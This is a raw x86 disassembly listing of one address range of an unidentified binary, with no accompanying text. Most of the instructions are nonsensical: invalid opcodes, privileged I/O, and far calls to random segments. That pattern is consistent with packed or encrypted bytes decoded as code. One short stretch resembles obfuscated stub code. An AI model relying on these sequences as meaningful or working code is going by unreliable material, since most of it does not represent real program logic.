  40ab49:	sbb    edx,DWORD PTR [esi+eax*4-0x6]
  40ab4d:	jae    0x40aaf0
  40ab4f:	xor    ah,BYTE PTR [ebp+esi*4-0x7e]
  40ab53:	pop    ecx
  40ab54:	clc    
  40ab55:	fcomp  QWORD PTR ds:0xebfd490a
  40ab5b:	push   0x5ad63d2d
  40ab60:	cmp    al,0x20
  40ab62:	sub    DWORD PTR [edi+eax*8],eax
  40ab65:	jnp    0x40ab85
  40ab67:	cmp    dh,dl
  40ab69:	xor    ecx,DWORD PTR [esi+0x7c]
  40ab6c:	adc    ah,ah
  40ab6e:	arpl   WORD PTR [ecx+0x42ed7d8b],bx
  40ab74:	push   ebp
  40ab75:	push   es
  40ab76:	sar    DWORD PTR [esi+0x23],cl
  40ab79:	mov    ?,WORD PTR [edi+0x63]
  40ab7c:	xchg   ebx,eax
  40ab7d:	cwde   
  40ab7e:	fbld   TBYTE PTR [edx+0x46c7712]
  40ab84:	test   al,0x48
  40ab86:	or     DWORD PTR [ebp-0x33],edx
  40ab89:	(bad)  
  40ab8a:	jmp    0x40ac01
  40ab8c:	retf   
  40ab8d:	shl    BYTE PTR [edx+eax*4],cl
  40ab90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab91:	push   ebx
  40ab92:	jl     0x40abff
  40ab94:	sub    DWORD PTR [esi+0xe1450],edi
  40ab9a:	cdq    
  40ab9b:	stos   BYTE PTR es:[edi],al
  40ab9c:	jbe    0x40ab8b
  40ab9e:	stos   DWORD PTR es:[edi],eax
  40ab9f:	cwde   
  40aba0:	sub    edx,DWORD PTR [edx+eax*4+0x7ec5b9f2]
  40aba7:	push   esi
  40aba8:	mov    ds:0xdf2afaeb,al
  40abad:	add    eax,0x77c236fe
  40abb2:	popa   
  40abb3:	lock scas al,BYTE PTR es:[edi]
  40abb5:	lods   eax,DWORD PTR ds:[esi]
  40abb6:	jnp    0x40abda
  40abb8:	(bad)  [ecx-0x1bbbe4f]
  40abbe:	mov    esi,0xe5344a64
  40abc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abc4:	sbb    al,0x9
  40abc6:	mov    esi,0x76a378a1
  40abcb:	xchg   esp,eax
  40abcc:	xchg   esi,eax
  40abcd:	sub    ecx,ecx
  40abcf:	push   0x692ebf4a
  40abd4:	(bad)  
  40abd5:	push   edx
  40abd6:	dec    esi
  40abd7:	retf   0xc37f
  40abda:	test   eax,0xc4a20b41
  40abdf:	xlat   BYTE PTR ds:[ebx]
  40abe0:	pop    esi
  40abe1:	shl    BYTE PTR [edx+0x60995ea8],1
  40abe7:	xor    DWORD PTR ds:0x612c968e,ecx
  40abed:	mov    edx,0xa03febf6
  40abf2:	xchg   ebp,eax
  40abf3:	stos   BYTE PTR es:[edi],al
  40abf4:	sub    al,0x38
  40abf6:	loope  0x40ab80
  40abf8:	mov    bl,0xc8
  40abfa:	cmp    dl,dl
  40abfc:	lock ffreep st(1)
  40abff:	push   es
  40ac00:	rcl    DWORD PTR [esi+0x7c],1
  40ac03:	into   
  40ac04:	sub    DWORD PTR [ebx],0xffffffdb
  40ac07:	mov    edx,fs
  40ac09:	adc    eax,0x22f74042
  40ac0e:	cmp    DWORD PTR [esi+0x73],eax
  40ac11:	fadd   DWORD PTR [ebp-0x72]
  40ac14:	fwait
  40ac15:	mov    ah,0x3e
  40ac17:	and    DWORD PTR [edx+0x4f617030],ebp
  40ac1d:	push   0x1a
  40ac1f:	or     DWORD PTR [ecx-0x7d80605e],eax
  40ac25:	fnsave [esi+0x47]
  40ac28:	xor    ebx,ebp
  40ac2a:	mov    ah,0x37
  40ac2c:	and    al,0xc3
  40ac2e:	push   0xffffff8e
  40ac30:	sub    dl,bl
  40ac32:	fidivr WORD PTR [ecx+0x28513eff]
  40ac38:	inc    eax
  40ac39:	mov    edx,0xb3fbdc6c
  40ac3e:	pop    es
  40ac3f:	jl     0x40acab
  40ac41:	test   BYTE PTR [eax+0x164dd0c1],bl
  40ac47:	out    0x5b,eax
  40ac49:	inc    edi
  40ac4a:	adc    DWORD PTR [ecx-0x34],0xffffffae
  40ac4e:	(bad)  
  40ac4f:	adc    esi,DWORD PTR [ebp+0x4a]
  40ac52:	ja     0x40ac62
  40ac54:	call   0x8747:0x6cb91f49
  40ac5b:	shr    DWORD PTR [edi-0xb],0x2f
  40ac5f:	sub    ah,BYTE PTR [eax-0x49214616]
  40ac65:	jbe    0x40ac12
  40ac67:	add    ebp,edi
  40ac69:	mov    ds:0xdaac02be,eax
  40ac6e:	adc    eax,DWORD PTR [ebp+0x48]
  40ac71:	jmp    0x432ef3e7
  40ac76:	dec    esi
  40ac77:	or     DWORD PTR [esi-0x20],edx
  40ac7a:	retf   
  40ac7b:	mov    dh,dl
  40ac7d:	add    al,0xc3
  40ac7f:	sti    
  40ac80:	mov    ebx,0xa2b312a1
  40ac85:	call   0xc9f2:0x1a308b14
  40ac8c:	jnp    0x40acf6
  40ac8e:	adc    ebp,esp
  40ac90:	jbe    0x40ac30
  40ac92:	inc    edi
  40ac93:	cdq    
  40ac94:	pop    es
  40ac95:	pop    edx
  40ac96:	mov    dl,BYTE PTR fs:[esi+0x7fe4ea85]
  40ac9d:	and    edx,DWORD PTR [esi]
  40ac9f:	iret   
  40aca0:	mov    edx,DWORD PTR [eax+eax*2]
  40aca3:	out    dx,al
  40aca4:	jns    0x40acff
  40aca6:	gs mov ch,0x27
  40aca9:	in     eax,0xff
  40acab:	mov    WORD PTR [ebx],ss
  40acad:	(bad)  
  40acae:	xchg   esi,eax
  40acaf:	nop
  40acb0:	jne    0x40ac61
  40acb2:	and    BYTE PTR [ecx],bl
  40acb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acb5:	sub    esp,DWORD PTR [edx-0x7c83216b]
  40acbb:	mov    DWORD PTR [ebp+0x24],ebp
  40acbe:	arpl   WORD PTR [esi+0x1211f105],di
  40acc4:	pop    ebx
  40acc5:	inc    ebp
  40acc6:	aad    0x84
  40acc8:	xchg   ebp,eax
  40acc9:	jae    0x40ad39
  40accb:	sub    esi,DWORD PTR [edi+0xc]
  40acce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40accf:	scas   eax,DWORD PTR es:[edi]
  40acd0:	xor    BYTE PTR es:[eax+ebx*2],cl
  40acd4:	test   DWORD PTR [edi+esi*2],esi
  40acd7:	test   BYTE PTR [eax+0x2d22fb70],bl
  40acdd:	jge    0x40ad3c
  40acdf:	xchg   esi,eax
  40ace0:	ss jecxz 0x40acf5
  40ace3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace4:	push   esi
  40ace5:	cmp    bh,BYTE PTR [edi-0x7169a126]
  40aceb:	push   ds
  40acec:	pop    esp
  40aced:	push   ebp
  40acee:	mov    ch,0xe
  40acf0:	pusha  
  40acf1:	ds mov esp,0x1427ea9f
  40acf7:	pop    ecx
  40acf8:	icebp  
  40acf9:	dec    esi
  40acfa:	retf   
  40acfb:	test   BYTE PTR [esi-0x5f],bh
  40acfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acff:	mov    ds:0x1a31b5cf,al
  40ad04:	jmp    0xc24e:0x340f762
  40ad0b:	mov    cl,0x7f
  40ad0d:	pop    esi
  40ad0e:	scas   al,BYTE PTR es:[edi]
  40ad0f:	mov    esi,0xbc8d62f7
  40ad14:	mov    bh,0x92
  40ad16:	ss mov edi,0xf3b4dbcd
  40ad1c:	dec    edi
  40ad1d:	add    BYTE PTR [edx-0x5e],bh
  40ad20:	dec    esp
  40ad21:	and    cl,ah
  40ad23:	les    ebx,FWORD PTR [esi]
  40ad25:	aad    0x46
  40ad27:	pop    ds
  40ad28:	ret    
  40ad29:	xor    al,0xa0
  40ad2b:	jbe    0x40acb5
  40ad2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad2e:	push   es
  40ad2f:	mov    dl,0x99
  40ad31:	dec    ecx
  40ad32:	sbb    esp,eax
  40ad34:	std    
  40ad35:	shl    BYTE PTR [eax+edi*4-0x6],1
  40ad39:	mov    ah,0x5
  40ad3b:	or     DWORD PTR [edi+0x53d2750],ebx
  40ad41:	xor    esi,DWORD PTR [ebx+edx*8-0x1]
  40ad45:	lods   eax,DWORD PTR ds:[esi]
  40ad46:	push   esi
  40ad47:	pop    ecx
  40ad48:	push   esp
  40ad49:	push   edi
  40ad4a:	dec    ebx
  40ad4b:	lock xor eax,0xb98a2abc
  40ad51:	inc    esi
  40ad52:	cs mov dh,0xa2
  40ad55:	mov    esi,0x68849fb0
  40ad5a:	mov    esp,0x2878e0af
  40ad5f:	push   ebx
  40ad60:	mov    ebx,0xd12f4291
  40ad65:	pop    esp
  40ad66:	scas   eax,DWORD PTR es:[edi]
  40ad67:	xchg   ebp,eax
  40ad68:	jmp    0x40ad2f
  40ad6a:	nop
  40ad6b:	push   eax
  40ad6c:	pop    ebp
  40ad6d:	stc    
  40ad6e:	dec    esi
  40ad6f:	test   DWORD PTR [eax],esi
  40ad71:	stc    
  40ad72:	pop    ebx
  40ad73:	fcom   DWORD PTR [eax+0x4238d77b]
  40ad79:	cmp    BYTE PTR [ebx],0xd2
  40ad7c:	test   eax,0x2e4ec5af
  40ad81:	mov    ecx,DWORD PTR [ebp+0x62]
  40ad84:	stos   BYTE PTR es:[edi],al
  40ad85:	cmp    al,0xc6
  40ad87:	and    al,0xa9
  40ad89:	test   ebx,eax
  40ad8b:	icebp  
  40ad8c:	inc    ebx
  40ad8d:	inc    esp
  40ad8e:	inc    edi
  40ad8f:	and    ecx,DWORD PTR [eax-0x4f]
  40ad92:	xlat   BYTE PTR ds:[ebx]
  40ad93:	xchg   edx,eax
  40ad94:	sbb    DWORD PTR [ebx],esi
  40ad96:	js     0x40adb8
  40ad98:	out    0x7b,eax
  40ad9a:	pusha  
  40ad9b:	jge    0x40ad70
  40ad9d:	mov    bl,0x21
  40ad9f:	xor    eax,0x3c514e8e
  40ada4:	pop    ss
  40ada5:	adc    esp,eax
  40ada7:	lods   eax,DWORD PTR ds:[esi]
  40ada8:	lods   eax,DWORD PTR ds:[esi]
  40ada9:	je     0x40adcd
  40adab:	in     al,dx
  40adac:	fdiv   st,st(6)
  40adae:	cmp    BYTE PTR [ebx],0x40
  40adb1:	rol    DWORD PTR [ebp+0x1e5001cd],1
  40adb7:	jmp    0xf9bd:0xa9f38a15
  40adbe:	in     eax,0xda
  40adc0:	loop   0x40adae
  40adc2:	xor    DWORD PTR [eax+0x2],edi
  40adc5:	xchg   ecx,eax
  40adc6:	xor    BYTE PTR [ebx+0x4c326d9f],bl
  40adcc:	mov    ds:0xe461e3df,eax
  40add1:	iret   
  40add2:	jo     0x40ad59
  40add4:	cld    
  40add5:	mov    esp,0x74b971ea
  40adda:	cmp    eax,0x4d5647e9
  40addf:	add    DWORD PTR [esi],esi
  40ade1:	pop    ebp
  40ade2:	cmp    dh,BYTE PTR [esi+0x15091ed5]
  40ade8:	dec    eax
  40ade9:	repnz clc 
  40adeb:	mov    DWORD PTR [ebp-0x34a5df08],esi
  40adf1:	inc    ebx
  40adf2:	icebp  
  40adf3:	sbb    ah,0x8e
  40adf6:	outs   dx,DWORD PTR ds:[esi]
  40adf7:	out    dx,al
  40adf8:	shl    BYTE PTR [ecx],1
  40adfa:	and    bl,bh
  40adfc:	dec    ecx
  40adfd:	inc    ecx
  40adfe:	lahf   
  40adff:	cmp    eax,0x1e634dd1
  40ae04:	push   ss
  40ae05:	xchg   BYTE PTR [edx+edx*4+0x7126b21e],bl
  40ae0c:	shr    BYTE PTR [esi],cl
  40ae0e:	fadd   QWORD PTR [eax-0x53e62ec7]
  40ae14:	sahf   
  40ae15:	inc    esi
  40ae16:	sub    al,ah
  40ae18:	adc    BYTE PTR [esi+0x43fc8540],bl
  40ae1e:	cli    
  40ae1f:	dec    edi
  40ae20:	cmp    eax,0x3ce44a91
  40ae25:	jo     0x40ae0f
  40ae27:	int    0xee
  40ae29:	dec    eax
  40ae2a:	sbb    al,0xa3
  40ae2c:	inc    esi
  40ae2d:	jge    0x40ae83
  40ae2f:	inc    ecx
  40ae30:	(bad)  
  40ae31:	mov    WORD PTR [edx+esi*1-0x19d2f2d9],ss
  40ae38:	or     BYTE PTR [esi],bh
  40ae3a:	cmp    ebx,ebx
  40ae3c:	cmp    esp,DWORD PTR [esi-0xec30318]
  40ae42:	adc    DWORD PTR [ecx+eiz*8+0x19],0xffffffcb
  40ae47:	inc    edi
  40ae48:	jns    0x40ae11
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42829b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428263
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428397,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42827b
  40aea0:	cmp    DWORD PTR ds:0x42829b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280cb
  40aebd:	call   DWORD PTR ds:0x428e88
  40aec3:	mov    ecx,DWORD PTR ds:0x42831b
  40aec9:	xor    DWORD PTR ds:0x42823f,ecx
  40aecf:	or     DWORD PTR ds:0x42838b,ecx
  40aed5:	or     DWORD PTR ds:0x4282a3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282af
  40aee1:	adc    DWORD PTR ds:0x428277,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428173
  40aeef:	adc    ecx,DWORD PTR ds:0x428397
  40aef5:	mov    DWORD PTR ds:0x428173,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428393,0x428307
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428173,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	jge    0x40af87
  40af31:	inc    ebx
  40af32:	push   0xffffffb5
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	out    dx,eax
  40af3c:	jecxz  0x40af04
  40af3e:	es add cl,ch
  40af41:	test   al,0xb9
  40af43:	cli    
  40af44:	xchg   ebp,eax
  40af45:	leave  
  40af46:	mov    cl,ch
  40af48:	xor    DWORD PTR [ebp+0x29],eax
  40af4b:	push   0xffffffdc
  40af4d:	xchg   ebp,eax
  40af4e:	ins    BYTE PTR es:[edi],dx
  40af4f:	loope  0x40aee1
  40af51:	adc    cl,dh
  40af53:	mov    ebx,0x2146ae9
  40af58:	in     eax,dx
  40af59:	imul   edx,ebx,0x8af82a33
  40af5f:	pop    ecx
  40af60:	bound  edi,QWORD PTR [ebp-0x432d072e]
  40af66:	pushf  
  40af67:	ret    
  40af68:	jb     0x40afcf
  40af6a:	iret   
  40af6b:	in     eax,0x54
  40af6d:	mov    cl,0xa5
  40af6f:	por    mm2,mm4
  40af72:	fdivr  DWORD PTR [edx+ebx*1+0x3028feee]
  40af79:	dec    ebx
  40af7a:	xchg   esi,eax
  40af7c:	mov    dl,0x57
  40af7e:	(bad)  
  40af7f:	test   eax,0xe151ced8
  40af84:	enter  0x108c,0xb8
  40af88:	imul   eax,eax,0xd66a6eed
  40af8e:	(bad)  
  40af8f:	xchg   edi,eax
  40af90:	into   
  40af91:	ins    DWORD PTR es:[edi],dx
  40af92:	cld    
  40af93:	mov    ds:0x681c6b1c,eax
  40af98:	shl    al,0x40
  40af9b:	movd   mm4,DWORD PTR [esi+ebp*2+0x6d]
  40afa0:	fsubr  DWORD PTR [edx-0x1ae2e2a8]
  40afa6:	ror    ebp,1
  40afa8:	mov    bh,BYTE PTR [eax+esi*4+0x6f]
  40afac:	push   esi
  40afad:	test   BYTE PTR [ecx+ebp*2+0x60],dh
  40afb1:	push   ebp
  40afb2:	xor    DWORD PTR [esi],ebp
  40afb4:	lahf   
  40afb5:	and    ch,dh
  40afb7:	(bad)  
  40afb8:	jbe    0x40b034
  40afba:	int3   
  40afbb:	aas    
  40afbc:	jno    0x40aff5
  40afbe:	icebp  
  40afbf:	enter  0x76b2,0x32
  40afc3:	mov    ds:0xdce1f253,eax
  40afc8:	call   0x8d8e4eba
  40afcd:	loop   0x40af92
  40afcf:	(bad)  
  40afd0:	and    BYTE PTR [edx+0x4b31fd65],ah
  40afd6:	jecxz  0x40af79
  40afd8:	(bad)  
  40afd9:	pop    ebx
  40afda:	and    eax,0x61f4f73d
  40afdf:	data16 add BYTE PTR [edx+0x577188bf],bh
  40afe6:	loopne 0x40aff3
  40afe8:	mov    ch,0x47
  40afea:	rol    BYTE PTR [ecx],1
  40afec:	(bad)  
  40afee:	jp     0x40afce
  40aff0:	iret   
  40aff1:	xor    ch,BYTE PTR [ecx+0x50]
  40aff4:	test   BYTE PTR [edi+0x25],cl
  40aff7:	leave  
  40aff8:	pop    esi
  40aff9:	enter  0x305e,0x7c
  40affd:	popa   
  40affe:	mov    WORD PTR [esi],ds
  40b000:	add    BYTE PTR [ebx+0x271b637d],dh
  40b006:	adc    dh,cl
  40b008:	mov    esi,0xe2e59176
  40b00d:	(bad)  
  40b00e:	pop    ds
  40b00f:	in     eax,dx
  40b010:	adc    eax,0xbefd78d6
  40b015:	add    DWORD PTR [esi],ecx
  40b017:	jl     0x40afcd
  40b019:	int    0xfb
  40b01b:	sub    esi,edx
  40b01d:	add    bl,BYTE PTR ds:0x5a2591ed
  40b023:	jle    0x40b059
  40b025:	xchg   edx,eax
  40b026:	jnp    0x40afaa
  40b028:	aam    0xde
  40b02a:	jl     0x40afae
  40b02c:	imul   ebx,DWORD PTR [edi-0x20a8dc87],0x8
  40b033:	loop   0x40b089
  40b035:	adc    eax,0x5eb59c17
  40b03a:	ins    BYTE PTR es:[edi],dx
  40b03b:	add    ah,BYTE PTR [edx-0x1e5b4fb6]
  40b041:	ffreep st(5)
  40b043:	(bad)  
  40b044:	mov    edi,0xad534b0c
  40b049:	jecxz  0x40b072
  40b04b:	pop    eax
  40b04c:	xor    BYTE PTR [eax],dl
  40b04e:	pop    ebx
  40b04f:	mov    BYTE PTR [ecx+0x1],dl
  40b052:	ret    
  40b053:	sahf   
  40b054:	int    0xce
  40b056:	jbe    0x40b037
  40b058:	adc    eax,0x7cee9121
  40b05d:	arpl   WORD PTR [esi+0x32cd900d],di
  40b063:	aaa    
  40b064:	jmp    0xc052:0xeb386294
  40b06b:	rcl    DWORD PTR [edi],1
  40b06d:	jns    0x40b0aa
  40b06f:	rcr    DWORD PTR [edx],0x8b
  40b072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b073:	dec    ecx
  40b074:	test   eax,0x66c4e6a5
  40b079:	mov    ebp,0xdd5f41e6
  40b07e:	dec    edx
  40b07f:	ret    0x33a3
  40b082:	and    BYTE PTR [eax-0x558eaf8c],0x31
  40b089:	ror    BYTE PTR [esi-0x4c06c491],0x9a
  40b090:	inc    ebp
  40b091:	or     eax,0x9c5c4e6b
  40b096:	inc    ebp
  40b097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b098:	mov    ch,0x8b
  40b09a:	addr16 jne 0x40b10e
  40b09d:	mov    cl,0x1a
  40b09f:	push   ebx
  40b0a0:	test   al,0x43
  40b0a2:	or     al,0x57
  40b0a4:	xchg   edi,eax
  40b0a5:	jnp    0x40b0b3
  40b0a7:	mov    ds:0x7d94c779,al
  40b0ac:	out    dx,al
  40b0ad:	(bad)  
  40b0ae:	in     eax,0xc8
  40b0b0:	stc    
  40b0b1:	aad    0x97
  40b0b3:	popf   
  40b0b4:	and    bl,BYTE PTR [esi-0x557207d4]
  40b0ba:	xchg   DWORD PTR [ebp+0x101087d6],ecx
  40b0c0:	sbb    al,0xf
  40b0c2:	xor    al,0x52
  40b0c4:	jp     0x40b0ca
  40b0c6:	shl    BYTE PTR [eax],cl
  40b0c8:	call   0x51f6:0x13fc6424
  40b0cf:	stos   DWORD PTR es:[edi],eax
  40b0d0:	push   edx
  40b0d1:	leave  
  40b0d2:	dec    ebx
  40b0d3:	push   ebx
  40b0d4:	add    DWORD PTR [ebx-0x41],esi
  40b0d7:	fisttp QWORD PTR [edx-0x17a5945a]
  40b0dd:	arpl   WORD PTR [ecx-0x74686ea],si
  40b0e3:	inc    edx
  40b0e4:	loopne 0x40b114
  40b0e6:	fistp  WORD PTR [ecx-0x40]
  40b0e9:	pusha  
  40b0ea:	and    ah,ah
  40b0ec:	outs   dx,BYTE PTR ds:[esi]
  40b0ed:	cwde   
  40b0ee:	lods   eax,DWORD PTR ds:[esi]
  40b0ef:	arpl   WORD PTR [ebp+0x7],cx
  40b0f2:	call   0x1b8ce479
  40b0f7:	ret    0x7ba4
  40b0fa:	or     edi,0x38
  40b0fd:	out    0x69,eax
  40b0ff:	mov    al,0x83
  40b101:	hlt    
  40b102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b103:	enter  0xf194,0x7
  40b107:	dec    esp
  40b108:	dec    edx
  40b109:	pushf  
  40b10a:	test   DWORD PTR [ecx],ebx
  40b10c:	shl    ah,cl
  40b10e:	mov    bl,ch
  40b110:	jno    0x40b16f
  40b112:	jnp    0x40b13b
  40b114:	bnd data16 jg 0x40b177
  40b118:	or     BYTE PTR [edi+0x1605dd83],dl
  40b11e:	pop    ds
  40b11f:	push   es
  40b120:	jecxz  0x40b10d
  40b122:	push   0xb0b48f76
  40b127:	sub    dh,BYTE PTR [edi+0x34]
  40b12a:	cli    
  40b12b:	pop    eax
  40b12c:	(bad)  
  40b12d:	pop    edi
  40b12e:	outs   dx,BYTE PTR ds:[esi]
  40b12f:	mov    ch,0x3e
  40b131:	stos   BYTE PTR es:[edi],al
  40b132:	es dec edx
  40b134:	pop    edi
  40b135:	ins    DWORD PTR es:[edi],dx
  40b136:	aas    
  40b137:	push   esp
  40b138:	adc    BYTE PTR [eax-0x18],bh
  40b13b:	nop
  40b13c:	je     0x40b1b6
  40b13e:	push   ss
  40b13f:	gs addr16 xchg esi,eax
  40b142:	jp     0x40b16a
  40b144:	sub    al,BYTE PTR [ebp+0x48]
  40b147:	call   0x90780c1e
  40b14c:	dec    edi
  40b14d:	add    dl,BYTE PTR [eax+ecx*4+0x5f]
  40b151:	or     ah,0x87
  40b154:	adc    WORD PTR [bx],0xffca
  40b159:	into   
  40b15a:	mov    eax,0x4e896781
  40b15f:	lods   al,BYTE PTR ds:[esi]
  40b160:	or     BYTE PTR [ecx],bh
  40b162:	sbb    al,0xa
  40b164:	addr16 aaa 
  40b166:	stos   BYTE PTR es:[edi],al
  40b167:	mov    al,0x47
  40b169:	adc    cl,cl
  40b16b:	aad    0x94
  40b16d:	shl    BYTE PTR [bx+di],1
  40b170:	stos   BYTE PTR es:[edi],al
  40b171:	stc    
  40b172:	cld    
  40b173:	sbb    dh,BYTE PTR [ebp-0x52187730]
  40b179:	sbb    DWORD PTR [esi],eax
  40b17b:	iret   
  40b17c:	push   cs
  40b17d:	mov    cl,0x46
  40b17f:	jmp    0xa0ad5785
  40b184:	pop    eax
  40b185:	leave  
  40b186:	aam    0x6e
  40b188:	adc    DWORD PTR [esi],ebx
  40b18a:	sub    eax,0x260478f4
  40b18f:	stos   BYTE PTR es:[edi],al
  40b190:	xchg   esp,eax
  40b191:	push   ebx
  40b192:	ds adc dl,bl
  40b195:	inc    ecx
  40b196:	xchg   esi,eax
  40b197:	cli    
  40b198:	lods   eax,DWORD PTR ds:[esi]
  40b199:	imul   eax,DWORD PTR [eax+0x57],0x25ee383a
  40b1a0:	jnp    0x40b190
  40b1a2:	fcom   DWORD PTR [ebp+0x2887c238]
  40b1a8:	sub    eax,0x21da891d
  40b1ad:	out    0x19,al
  40b1af:	imul   edx,DWORD PTR [ebp-0x59c229d3],0xbb28be95
  40b1b9:	jmp    0xa6a67dbf
  40b1be:	div    BYTE PTR [edx+0x54]
  40b1c1:	pop    ebp
  40b1c2:	ror    DWORD PTR [edx],cl
  40b1c4:	dec    esi
  40b1c5:	and    bl,ah
  40b1c7:	out    dx,al
  40b1c8:	inc    ebx
  40b1c9:	and    BYTE PTR [esi-0x36d2b395],bl
  40b1cf:	aad    0x26
  40b1d1:	(bad)  
  40b1d2:	jne    0x40b200
  40b1d4:	mov    ebx,0xdde74369
  40b1d9:	loope  0x40b234
  40b1db:	sbb    BYTE PTR [ebx-0x35431d83],0x47
  40b1e2:	pop    es
  40b1e3:	(bad)  
  40b1e5:	inc    ebx
  40b1e6:	mov    BYTE PTR [esi+edx*2],bl
  40b1e9:	dec    ebp
  40b1ea:	sub    BYTE PTR [edx-0x5fe2aacf],cl
  40b1f0:	pop    esp
  40b1f1:	dec    ecx
  40b1f2:	(bad)  
  40b1f3:	loope  0x40b274
  40b1f5:	mov    bl,0x61
  40b1f7:	jge    0x40b1d6
  40b1f9:	ja     0x40b25e
  40b1fb:	push   cs
  40b1fc:	cmp    al,0x42
  40b1fe:	stos   BYTE PTR es:[edi],al
  40b1ff:	mov    edi,0x8b84510b
  40b204:	xchg   DWORD PTR [eax-0x1b443aa9],esi
  40b20a:	int    0x7f
  40b20c:	aad    0x3f
  40b20e:	and    eax,0x1cff0f37
  40b213:	mov    dh,0x2
  40b215:	and    eax,0x41
  40b218:	into   
  40b219:	rcr    DWORD PTR [ecx],0xc4
  40b21c:	xor    eax,DWORD PTR [eax]
  40b21e:	das    
  40b21f:	retf   
  40b220:	push   ebx
  40b221:	test   BYTE PTR [eax+eiz*4],al
  40b224:	(bad)  
  40b225:	pushf  
  40b226:	arpl   WORD PTR [ebx],si
  40b228:	iret   
  40b229:	push   ss
  40b22a:	mul    edi
  40b22c:	mov    dh,0xff
  40b22e:	icebp  
  40b22f:	imul   esi,eax,0x5dddb07f
  40b235:	fstp   QWORD PTR [ecx-0x17e3096b]
  40b23b:	repnz inc eax
  40b23d:	loopne 0x40b29e
  40b23f:	dec    ecx
  40b240:	push   0x7c
  40b242:	add    al,0xf
  40b244:	push   ds
  40b245:	cli    
  40b246:	push   ecx
  40b247:	and    eax,0xdd4767c2
  40b24c:	mov    WORD PTR [ebp+0x7674221f],?
  40b252:	daa    
  40b253:	adc    eax,esi
  40b255:	aam    0x3c
  40b257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b258:	gs aam 0xe0
  40b25b:	push   ss
  40b25c:	and    al,0xd4
  40b25e:	fsubr  QWORD PTR ds:0xac6a9724
  40b264:	sbb    BYTE PTR [esi+0x494c2eb3],0x94
  40b26b:	push   ecx
  40b26c:	scas   eax,DWORD PTR es:[edi]
  40b26d:	mov    bl,0xe3
  40b26f:	sub    DWORD PTR [ebp+0x4c],ebp
  40b272:	xor    esi,DWORD PTR [ecx+ecx*1]
  40b275:	or     eax,0x6da88e43
  40b27a:	push   0x5b
  40b27c:	jp     0x40b1ff
  40b27e:	fsub   st(5),st
  40b280:	jle    0x40b2c0
  40b282:	sbb    BYTE PTR [ebx+0x32],ch
  40b285:	lock push ss
  40b287:	nop
  40b288:	out    0x6b,eax
  40b28a:	es add eax,0xea81e0ff
  40b290:	and    al,0xf3
  40b292:	stc    
  40b293:	sub    ah,BYTE PTR [ebp-0x18d52ab0]
  40b299:	std    
  40b29a:	fwait
  40b29b:	repnz loope 0x40b248
  40b29e:	sar    BYTE PTR [edi],0xb2
  40b2a1:	add    esi,DWORD PTR [edi+0x3c9ec6fa]
  40b2a7:	(bad)  
  40b2a9:	fcom   st(5)
  40b2ab:	int    0xa3
  40b2ad:	mov    esp,0x1fd3773
  40b2b2:	idiv   BYTE PTR [edx-0x16]
  40b2b5:	adc    al,0xed
  40b2b7:	xchg   edi,eax
  40b2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b9:	mov    dh,0x95
  40b2bb:	dec    ebx
  40b2bc:	repz inc edi
  40b2be:	call   0xeb70d0cc
  40b2c3:	inc    esi
  40b2c4:	mov    ebx,0xea7465af
  40b2ca:	call   0x731b:0xcdbbfa0f
  40b2d1:	adc    ch,BYTE PTR [esi+0x70]
  40b2d4:	mov    cl,0x13
  40b2d6:	jno    0x40b34a
  40b2d8:	jmp    0x6b8fb9bf
  40b2dd:	popf   
  40b2de:	jbe    0x40b2a7
  40b2e0:	adc    al,0x7f
  40b2e2:	loope  0x40b34b
  40b2e4:	sub    DWORD PTR [ebx+0x1eb8f747],esi
  40b2ea:	js     0x40b29f
  40b2ec:	mov    esp,0xad9f67ce
  40b2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f2:	out    0x12,al
  40b2f4:	lods   eax,DWORD PTR ds:[esi]
  40b2f5:	cmp    bh,ah
  40b2f7:	popf   
  40b2f8:	pop    esp
  40b2f9:	lods   eax,DWORD PTR ds:[esi]
  40b2fa:	and    BYTE PTR ds:0x29299a65,dh
